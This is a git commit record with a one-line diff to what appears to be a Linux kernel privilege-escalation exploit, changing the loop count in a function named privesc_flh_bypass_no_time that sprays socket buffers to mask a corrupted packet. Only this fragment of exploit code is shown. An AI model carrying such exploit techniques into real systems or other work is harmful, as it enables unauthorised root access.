7cced283331b661768b4efcccbd7ec472ea3d5ea
Willenst <willenst@gmail.com>
2024-11-15 19:19:52 +0200

    test

--- src/main.c
+++ src/main.c
@@ -326,7 +326,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	//sleep(3);
 	
 	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT*100; i++)
+	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
 	{
 		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		recv_ipv4_udp(1);
